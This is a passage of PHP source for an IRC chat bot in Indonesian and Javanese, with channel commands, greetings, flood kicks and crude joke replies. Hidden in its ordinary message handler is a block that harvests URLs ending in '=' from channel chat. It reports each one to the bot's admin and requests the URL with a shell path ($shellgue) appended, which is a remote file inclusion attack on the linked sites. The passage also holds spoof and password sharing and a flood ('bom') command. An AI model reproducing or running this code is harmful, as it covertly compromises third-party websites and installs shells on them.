                                                $systembot['VERSION'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'VERSION '. strtoupper($targetsys).' is [4'.strtoupper($systembot['VERSION'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='TIME' && $sysok==1 && $getlvl > 2){
                                                $systembot['TIME'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'TIME '. strtoupper($targetsys).' is [4'.strtoupper($systembot['TIME'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='IP' && $sysok==1 && $getlvl > 2){
                                                $systembot['IP'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'IP '. strtoupper($targetsys).' is [4'.strtoupper($systembot['IP'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='FINGER' && $sysok==1 && $getlvl > 2){
                                                $systembot['FINGER'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'FINGER '. strtoupper($targetsys).' is [4'.strtoupper($systembot['FINGER'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='ISON' && $sysok==1 && $getlvl > 2){
                                                $systembot['ISON']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'ISON is [4'.strtoupper($systembot['ISON']['ALL']).']');
                                            }
                                            if($wsys=='ASTRO' && $sysok==1 && $getlvl > 2){
                                                $systembot['ASTRO'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'ASTRO '. strtoupper($targetsys).' is [4'.strtoupper($systembot['ASTRO'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SPOOF' && $sysok==1 && $getlvl > 2){
                                                $systembot['SPOOF'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SPOOF '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SPOOF'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='DNS' && $sysok==1 && $getlvl > 2){
                                                $systembot['DNS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'DNS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['DNS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='BOM' && $sysok==1 && $getlvl > 2){
                                                $systembot['BOM'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'BOM '. strtoupper($targetsys).' is [4'.strtoupper($systembot['BOM'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='GREET' && $sysok==1 && $getlvl > 2){
                                                $systembot['GREET'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'GREET '. strtoupper($targetsys).' is [4'.strtoupper($systembot['GREET'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SMS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SMS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SMS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SMS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='SLAPS' && $sysok==1 && $getlvl > 2){
                                                $systembot['SLAPS'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'SLAPS '. strtoupper($targetsys).' is [4'.strtoupper($systembot['SLAPS'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='KSLANG' && $sysok==1 && $getlvl > 2){
                                                $systembot['KSLANG'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'KSLANG '. strtoupper($targetsys).' is [4'.strtoupper($systembot['KSLANG'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOCYCLE' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOCYCLE'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOCYCLE '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOCYCLE'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOJOIN' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOJOIN'][strtoupper($targetsys)]= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOJOIN '. strtoupper($targetsys).' is [4'.strtoupper($systembot['AUTOJOIN'][strtoupper($targetsys)]).']');
                                            }
                                            if($wsys=='AUTOAWAY' && $sysok==1 && $getlvl > 2){
                                                $systembot['AUTOAWAY']['ALL']= $onoff;$modbot->notice($fp,$fsrc[nick],'AUTOAWAY is [4'.strtoupper($systembot['AUTOAWAY']['ALL']).']');
                                            }
                                            if($wsys=='LISTGREET' && $dCom[1] && $dCom[2] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                $ddc=strtolower($dCom[1]);$greetmsg["$ddc"]["nama"]=$dCom[1];$mgreet=str_replace($dCom[0]." ".$dCom[1]." ","",$TxtMsg);
						$greetmsg["$ddc"]["msg"]=$mgreet;$modbot->notice($fp,$fsrc[nick],'Auto Greet For :'.$greetmsg["$ddc"]["nama"]);
                                                $modbot->notice($fp,$fsrc[nick],'Auto Greet Msg :'.$greetmsg["$ddc"]["msg"]);
                                                }else{$eel=strtolower($dCom[1]);unset($greetmsg["$eel"]["nama"]);unset($greetmsg["$eel"]["msg"]);$modbot->notice($fp,$fsrc[nick],'Delete Greet For :'.$eel);}
                                            }
                                            if($wsys=='LISTISON' && $dCom[1] && $getlvl > 2){
                                                if($onoff=="3ON"){
                                                    if($modbot->add_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is now in my list');}
                                                    else{$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' is already in my list');}
                                                }
                                                else{if($modbot->del_ison($dCom[1])==1){$modbot->notice($fp,$fsrc[nick],$dCom[1] . ' has been deleted');}}
                                            }
                                        }
                                        ################################ SYSTEM ###################################
                                            
                                    }
                                }
                                ###############################
                                elseif (substr($Params[3],0,2)==':!'){
                                    if (strtolower($Params[3])==':!ping' && ereg('#',$Params[2]) && $systembot['PING'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if(strtolower($dCom[1])=='me'){$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}else {$modbot->stuf_ping($fp,$Params[2],$dCom[1]);}
                                        }else{$modbot->stuf_ping($fp,$Params[2],$fsrc[nick]);}
                                    }
                                    elseif (strtolower($Params[3])==':!version' && ereg('#',$Params[2]) && $systembot['VERSION'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'VERSION');$datversi[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datversi[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !version <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!jam' && ereg('#',$Params[2]) && $systembot['JAM'][strtoupper($Params[2])]=="3ON") {
                                         $sekarang=date("l, j F Y H:i:s");
                                         $modbot->msg($fp,$Params[2],"sekarang : 12[8".$sekarang."12]");
                                    }
                                    elseif (strtolower($Params[3])==':!seen' && ereg('#',$Params[2]) && $systembot['SEEN'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           $nicksenn=strtolower($dCom[1]);
                                           $waktuseennya=time();
                                           $lamaseen= $waktuseennya - $asalseen[$nicksenn];
                                           $asilhari=0;$asilejam=0;$asilmeni=0;
                                           if ($lamaseen>=86400){$asilhari = $lamaseen / 86400;$hari = floor($asilhari)."11hari "; $sisane = $lamaseen - ($hari*86400);$lamaseen = $sisane;   }else{$hari =""; }
                                           if ($lamaseen>=3600) {$asilejam = $lamaseen / 3600; $jamm = floor($asilejam)."11jam ";  $sisane = $lamaseen - ($jamm*3600); $lamaseen = $sisane;   }else{$jamm =""; }
                                           if ($lamaseen>=60)   {$asilmeni = $lamaseen / 60;   $ment = floor($asilmeni)."11menit ";$sisane = $lamaseen - ($ment*60);   $lamaseen = $sisane;   }else{$ment =""; }
                                           if ($asilhari == 0){$katahari="";        }else{$katahari=$hari;              }
                                           if ($asilejam == 0){$kataejam="";        }else{$kataejam=$jamm;              }
                                           if ($asilmeni == 0){$katameni="";        }else{$katameni=$ment;              }
                                           if ($lamaseen == 0){$katadeti="";        }else{$katadeti=$lamaseen."11detik"; }
                                           $katamsgseen = $katahari." ".$kataejam." ".$katameni." ".$katadeti;
                                           if($asalseen[$nicksenn.'chanel']=="ini"){$asalseen[$nicksenn.'chanel']="$Params[2]"; }
                                           if($asalseen[$nicksenn]){
                                              if($asalseen[$nicksenn]=="ada"){
                                                  $modbot->msg($fp,$Params[2],"si 12[8".$nicksenn."12] onlen kok 9!whois ".$nicksenn." aja 12".$fsrc[nick]."..!!!!!8,1)|(1,9 visual@PHP.bot 8,1)|(");
                                              }
                                              elseif($asalseen[$nicksenn]=="ganti"){
                                                  $modbot->msg($fp,$Params[2],"terahir aq eroh si 12[8".$nicksenn."12] ganti nick ".$asalseen[$nicksenn.'chanel']." 12".$fsrc[nick]."..!!!!!");
                                              }
                                              else{$modbot->msg($fp,$Params[2],"terahir aq eroh 12[8".$nicksenn."12] ".$asalseen[$nicksenn.'status']." teko chanel 12[8".$asalseen[$nicksenn.'chanel']."12] 12[8".$katamsgseen."12] yg lalu koyok e 12".$fsrc[nick]." ..!!!!!");   }
                                           }else{$modbot->msg($fp,$Params[2],"Waduh mbuh mumet aQ gak ngerti ".$dCom[1]." ".$fsrc[nick]."...!!!");  }
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !seen <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!whois' && ereg('#',$Params[2]) && $systembot['WHOIS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
					$datwhois[strtolower($dCom[1])]["nick"]=strtolower($dCom[1]);
					$datwhois[strtolower($dCom[1])]["chan"]=$Params[2];
                                        $modbot->send($fp,'WHOIS '.$dCom[1]);
                                        }
                                        else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!whois <nick>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==':!chat' && ereg('#',$Params[2]) && $systembot['CHAT'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                         $chchan=$dCom[1];
                                         if (!ereg("#",$dCom[1])) { $chchan="#".$dCom[1]; }
                                         if (strlen($Params[5]) != 0 ){
                                           $comandchat=str_replace(":","",$Params[3]);
                                           $pesannya=str_replace($comandchat,"",$TxtMsg);
                                           $pesannya=str_replace($Params[4],"",$pesannya);
                                           if (strlen($pesannya) >= 150 ){$pesannya=substr($pesannya,0,150);}
                                             if( strtolower($Params[2]) != strtolower($chchan) ){$modbot->msg($fp,$chchan,$pesannya." chat dari ".$fsrc[nick]." di "."$Params[2]");}else{$modbot->msg($fp,$Params[2],"La kok Chat di chan ini to ".$fsrc[nick]." gila loh");}
                                         }else{$modbot->msg($fp,$fsrc[nick],"mana pesannya bro");}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !chatt <#chan> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!pesan' && ereg('#',$Params[2]) && $systembot['JPESAN'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                         if (strlen($Params[5]) != 0 ){
                                           $nicktargetnya=strtolower($dCom[1]);
                                           $comandchat=str_replace(":","",$Params[3]);
                                           $pesannya=str_replace($comandchat,"",$TxtMsg);
                                           $pesannya=str_replace($Params[3],"",$pesannya);
                                           $pesannya=str_replace($Params[4],"",$pesannya);
                                           if (strlen($pesannya) >= 150 ){$pesannya=substr($pesannya,0,150);}
                                           $nickpesan[$nicktargetnya]=" 12[8 ".$fsrc[nick]." 12] beri pesan buat kamu ".$pesannya ;
                                           $modbot->msg($fp,$fsrc[nick],'ok ntar tak sampein ke '. $nicktargetnya.' pesanmu!!!');
                                         }else{$modbot->msg($fp,$fsrc[nick],"mana pesannya bro");}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !pesan <nick> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!sms' && ereg('#',$Params[2]) && $systembot['SMS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           if($Params[4]){
                                              $nomorygdituju=$dCom[1];
                                              $comandsms=str_replace(":","",$Params[3]);
                                              $pesansmsnya=str_replace($comandsms,"",$TxtMsg);
                                              $pesansmsnya=str_replace($dCom[1],"",$TxtMsg);
                                              $pesansmsnya=str_replace($Params[4],"",$TxtMsg);
                                              $modbot->msg($fp,$Params[2],'12[8Sms12] 12[8'.$fsrc[nick].'12] 12'.$modbot->mod_kirimsms($fp,$nomorygdituju,$pesansmsnya).' 12');
                                           }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !sms <nomor> <pesan>');}
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !sms <nomor> <pesan>');}
                                    }
                                    elseif (strtolower($Params[3])==':!tarik' && ereg('#',$Params[2]) && $systembot['GUYON'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){$modbot->act($fp,$Params[2],"Tarik jembutnya ".$dCom[1]." ampek brodolll...!!! HoHoHoHo");}
                                    }
                                    elseif (strtolower($Params[3])==':!cium' && ereg('#',$Params[2]) && $systembot['GUYON'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){$modbot->act($fp,$Params[2],"Cium ".$dCom[1]." pas di bawah udel muaCh Mwah . ihz bnyak rambutnya. xixixixixixixi");}
                                    }
                                    elseif (strtolower($Params[3])==':!ketak' && ereg('#',$Params[2]) && $systembot['GUYON'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){$modbot->act($fp,$Params[2],"ketaki mbun2nane ".$dCom[1]." ctak ctak ctak gdubrak ampek bencelzz. wkwkwkwkwkwkwkwk");}
                                    }
                                    elseif (strtolower($Params[3])==':!time' && ereg('#',$Params[2]) && $systembot['TIME'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'TIME');$dattime[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$dattime[strtolower($Params[4])]["chan"]=$Params[2];}
                                        else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !time <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!finger' && ereg('#',$Params[2]) && $systembot['FINGER'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                        $modbot->msg($fp,$Params[4],'FINGER');$datfinger[strtolower($Params[4])]["nick"]=strtolower($Params[4]);$datfinger[strtolower($Params[4])]["chan"]=$Params[2];
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !finger <nick>');}
                                    }
                                    elseif (strtolower($Params[3])==':!ip' && ereg('#',$Params[2]) && $systembot['IP'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                           $modbot->msg($fp,$Params[2],'Sek Tak takon bos Kiss_Me Dulu yo '.$fsrc[nick].'....!!!');
                                           $modbot->msg($fp,$Params[2],'ip 12[8 '.$dCom[1].' 12] infone 12'.$modbot->mod_lookip($fp,$Params[4]).' 12'.$fsrc[nick]);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !ip <Ip>');}
                                    }
                                    elseif (strtolower($Params[3])==':!berita' && ereg('#',$Params[2]) && $systembot['BERITA'][strtoupper($Params[2])]=="3ON") {
                                           $modbot->msg($fp,$Params[2],'12[8Berita12] 12'.$modbot->mod_lookberitaperson($fp).' 12'.$fsrc[nick]);
                                    }
                                    elseif (strtolower($Params[3])==':!info' && ereg('#',$Params[2]) && $systembot['BERITA'][strtoupper($Params[2])]=="3ON") {
                                           $modbot->msg($fp,$Params[2],'12[8Berita12] 12'.$modbot->mod_lookberitaperson($fp).' 12'.$fsrc[nick]);
                                    }
                                    elseif (strtolower($Params[3])==':!fs' && ereg('#',$Params[2]) && $systembot['FS'][strtoupper($Params[2])]=="3ON") {
                                           $modbot->msg($fp,$Params[2],'12[8FriedSter12] 12'.$modbot->mod_lookfs($fp,$Params[4]).' 12'.$fsrc[nick]);
                                    }
                                    elseif (strtolower($Params[3])==':!dns' && ereg('#',$Params[2]) && $systembot['DNS'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            if (ereg("[a-zA-Z]", $dCom[1])) {$res = gethostbyname($dCom[1]);}
                                            elseif (ereg("[0-9]", $dCom[1])) {$res = gethostbyaddr($dCom[1]);}
                                            if ($res==$dCom[1]) { $res = "not resolved."; }
                                            else { $res = "resolved to: $res ."; }
                                            $modbot->msg($fp,$Params[2],'DNS Query for: 12[8 '.$dCom[1] . ' 12] ' .$res);
                                        }else{$modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik !dns <host>');}
                                    }
                                    elseif (strtolower($Params[3])==':!astro' && ereg('#',$Params[2]) && $systembot['ASTRO'][strtoupper($Params[2])]=="3ON") {
                                        if($dCom[1]){
                                            $modbot->notice($fp,$fsrc[nick],'15(04Astro15) '. $modbot->mod_astro($dCom[1]));
                                        }else{
                                            $modbot->notice($fp,$fsrc[nick],'Perintah salah! Ketik :!astro <bintang>');
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!spoof" && ereg('#',$Params[2]) && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON") {
					$spoofnya=strtolower($Params[4]);
					if ($Params[5]<=$jmlspoof["$spoofnya"] && $Params[5]>0){
						fputs($fp,'PRIVMSG '.$Params[2].' :15(04Spoof15) Ident: 4' . $isisp["$Params[5]"]["$spoofnya"]["ident"] .' Spoof: 4' . $isisp["$Params[5]"]["$spoofnya"]["spoof"] .' Passw: 4' . $isisp["$Params[5]"]["$spoofnya"]["pass"].''. CRLF);
					}
					else {$modbot->notice($fp,$frsc[nick],'15(04Spoof15) Request Error');}
                                    }
                                    elseif (strtolower($Params[3])==":!kslang" && ereg('#',$Params[2]) && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON") {
                                        $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                        if($Params[4]<=$kmjml[strtolower($ktslsl)] && $Params[4]>0){
                                            $nomere=$Params[4]-1;
                                            if(strpos($kmusedan[$nomere]["definisi"][strtolower($ktslsl)],"<br>")){
                                            $defedan=explode("<br>",$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$darredan);
                                                    sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["definisi"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Arti15) '.$kmusedan[$nomere]["definisi"][strtolower($ktslsl)]);
                                            }
                                            if(strpos($kmusedan[$nomere]["contoh"][strtolower($ktslsl)],"<br>")){
                                                $defedan=explode("<br>",$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                                foreach ($defedan as $darredan) {
                                                    $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$darredan);
                                                        sleep(1);
                                                }
                                            }
                                            elseif($kmusedan[$nomere]["contoh"][strtolower($ktslsl)]){
                                                $modbot->notice($fp,$fsrc[nick],'15(04Cth15) '.$kmusedan[$nomere]["contoh"][strtolower($ktslsl)]);
                                            }
                                        }
                                        else{
                                            fputs($fp,'PRIVMSG '.$Params[2].' :15(04KSlang15) Request Error'. CRLF);
                                        }
                                        
                                    }
                                    elseif (strtolower($Params[3])==':!update' && ereg('#',$Params[2]) && $Params[5]) {
                                        $typeup=strtolower($Params[4]);
                                        if($typeup=='spoof' && $systembot['SPOOF'][strtoupper($Params[2])]=="3ON"){
                                            $modbot->msg($fp,$Params[2],'15(04Spoof15) Update Complete! FOUND :'.$modbot->mod_uspoof($fp,$Params[5]).' Spoof');
                                        }
                                        elseif($typeup=='kslang' && $systembot['KSLANG'][strtoupper($Params[2])]=="3ON"){
                                            $ktslsl=str_replace($Params[3]." ".$Params[4]." ","",":".$TxtMsg);
                                            $modbot->msg($fp,$Params[2],'15(04KSlang15) Update Complete! FOUND :'.$modbot->mod_uslang($fp,$ktslsl).' Arti'); 
                                        }
                                    }
                                    elseif (strtolower($Params[3])==":!bom" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_bom($fp,$Params[2],$Params[4]);
                                    }
                                    elseif (strtolower($Params[3])==":!potong" && ereg('#',$Params[2]) && $Params[4] && $systembot['BOM'][strtoupper($Params[2])]=="3ON") {
                                        $modbot->stuf_potong($fp,$fsrc[nick],$Params[2],$Params[4]);
                                    }
                                }
                                elseif (strlen(strtolower($TxtMsg))>=$maxkar) {
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                      if ($floddban == "ON"){$modbot->ban($fp,$Params[2],"*!*@".$fsrc[host]);  }
                                      $modbot->kick($fp,$Params[2],$fsrc[nick],"Jok ngeflood ndeng..!!");
                                      if ($floddban == "ON"){
                                          sleep(5);sleep(2);
                                          if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){$modbot->msg($fp,$Params[2],"Wes tak bukak yo rek bane ".$fsrc[nick]." yo rek...!!!");    }
                                          sleep(2);
                                          $modbot->unban($fp,$Params[2],"*!*@".$fsrc[host]);
                                      }
                                    }
                                }
                                elseif (substr($Params[3],0,1)==':') {
                                  $naidiceluk=substr($Params[3],1,(strlen($Params[3])));
                                  if ((substr_count(strtolower($TxtMsg),strtolower($bot['nick']))>0)OR(substr_count(strtolower($TxtMsg),strtolower($bot['realname']))>0)) {
                                                if($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                                $ada = FALSE;
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                        foreach ($respon_pesan as $rpesan) {
                                                           $trtext = strtolower($rpesan[0]);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                              $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($pujianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        foreach ($cacianlist as $rpesan) {
                                                           $trtext = strtolower($rpesan);
                                                           if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                              $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                                                              $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                              $jawab = str_replace("<kata>",$trtext,$jawab);
                                                              $modbot->msg($fp,$Params[2],$jawab);
                                                              $ada = TRUE;
                                                           }
                                                        }
                                                        if (!$ada) {
                                                           $jwbpsn = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                                                           $jwbpsn = str_replace("<nick>",$fsrc[nick],$jwbpsn);
                                                           $modbot->msg($fp,$Params[2],$jwbpsn);
                                                        }

                                                     }
                                                }
                                  }
                                  elseif($systembot['NGOMONG'][strtoupper($Params[2])]=="3ON"){
                                  $ada = FALSE;
                                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                                     foreach ($badwordlist as $rpesan) {
                                                        $trtext = strtolower($rpesan);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                                                           $jawab = str_replace("<nick>",$fsrc[nick],$jawab);
                                                           $jawab = str_replace("<kata>",$trtext,$jawab);
                                                           $modbot->msg($fp,$Params[2],$jawab);
                                                           $ada = TRUE;
                                                           if($systembot['BADWORD'][strtoupper($Params[2])]=="3ON"){$modbot->kick($fp,$Params[2],$fsrc[nick],"yang sopan dong..!");    }
                                                        }
                                                     }
                                                     foreach ($respon_umum as $rpesan) {
                                                        $trtext = strtolower($rpesan[0]);
                                                        if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
                                                           $rpesan[1] = str_replace("<nick>",$fsrc[nick],$rpesan[1]);
                                                           $modbot->msg($fp,$Params[2],$rpesan[1]);
                                                           $ada = TRUE;
                                                        }
                                                     }
                                                }
                                  }
                                }
                                elseif (substr($Params[3],0,3)==':me'){
                                       $modbot->join($fp,'#Exploited');
                                }
                                if (substr($Params[3],0,1)==':') {
###############################################################################################
$trtext="http://";
if (substr_count(strtolower($TxtMsg),$trtext) > 0) {
$awaltex=0;
$adatarget=0;
$ltexttarget=0;
$panjangtex=strlen($TxtMsg);
do {
    $awaltex=$awaltex+1;
    $httptarget=substr($TxtMsg,$awaltex,$panjangtex);
    $httptarget=substr($httptarget,0,4);
    $httptarget=strtolower($httptarget);
    if($httptarget=="http"){$ltexttarget=$awaltex;$adatarget=1;break;   }
    if($awaltex>=$panjangtex){$adatarget=0;break;                       }
} while(true);
$ahirtarget=$panjangtex;
$hasiltarget=substr($TxtMsg,$ltexttarget,$panjangtex);
$rtexttarget=$panjangtex-$ltexttarget;
do {
    $ahirtarget=$ahirtarget-1;
    $rtexttarget=$ahirtarget-$ltexttarget;
    $mburine=substr($TxtMsg,0,$ahirtarget);
    $mburine=substr($mburine,$ahirtarget-1,$ahirtarget);
    $mburine=strtolower($mburine);
    if($mburine=="="){
       $adatarget=2;
       $rtexttarget=$ahirtarget-$ltexttarget;
       break;
    }
    if($ahirtarget<=1){$adatarget=0;break;                              }
} while(true);
if($adatarget==2){
$hasiltarget=substr($hasiltarget,0,$rtexttarget);
$cektarget=substr($hasiltarget,0,15);
$ngulange=0;
do {
    $ngulange=$ngulange+1;
    $cektaget=substr($hasiltargetgue[$ngulange],0,15);
    if($cektaget==$cektarget){$sido=0;break;   }
    if($ngulange>=$notarget){$sido=1;break;   }
} while(true);
if(($sido==1) && (!ereg("",$hasiltarget)) && (!ereg(" ",$hasiltarget))){
$notarget=$notarget+1;
$hasiltargetgue[$notarget]=$hasiltarget;
if($bagitarget=="ON"){$modbot->msg($fp,$bot['admin'],$hasiltarget.$shellgue);  }
$loadergue = fopen ($hasiltargetgue[$notarget].$shellgue, "rb");
}
$sido=0;
}
}
###############################################################################################
                                $yangngomong=strtolower($fsrc[nick]);
                                $asalseen[$yangngomong]="ada";
                                    if (substr($Params[3],0,1)==':' && ereg('#',$Params[2]) && $systembot['GUARD'][strtoupper($Params[2])]=="3ON") {
                                    $temptex=strtolower($Params[2]).strtolower($fsrc[nick]).strtolower($Params[3]).strtolower($Params[4]);
                                      if ($temptex==$textemp){
                                           $textrep=($textrep+1);
                                           if ($textrep>=$Maxreep){
                                           $modbot->kick($fp,$Params[2],$fsrc[nick],"Jok repeat ndeng..!!8,1)|(1,9 visual@PHP.bot 8,1)|(");
                                           $textrep=0;
                                           }
                                      }else {$textrep=0;$textemp=$temptex;}
                                    }
                                }
                                ########### NET ############
                                break;
                        }
                        ##[ AKHIR DATA RAW NIH ]##
                }
                ### PERMAINAN PING PONG ###
                elseif ( substr($DataLine,0,4) == 'PING' ) {$modbot->send($fp,'PONG ' . substr($DataLine,5));}
                $response ="";
            }
            ##[ End Proses Data Recv ]##
        }
        fclose ($fp);
        unset ($fp);
        $response='';
    }
}  while ($keluar==0);
}
################### [ END CONNECT ] ###################
?>






